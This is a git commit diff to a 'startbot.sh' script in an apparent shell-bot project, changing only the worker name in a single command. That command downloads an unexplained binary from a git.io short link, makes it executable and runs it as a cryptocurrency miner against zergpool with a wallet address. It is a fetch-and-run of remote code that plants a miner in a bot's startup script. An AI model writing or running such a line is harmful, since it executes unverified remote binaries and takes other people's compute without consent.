a745358ba2fac91cbb0d55ad2433c1e6ce6a6190
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-11-20 11:29:00 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,4 +4,4 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.ngaceng -p c=LTC,mc=VRSC
+wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hotaru -p c=LTC,mc=VRSC
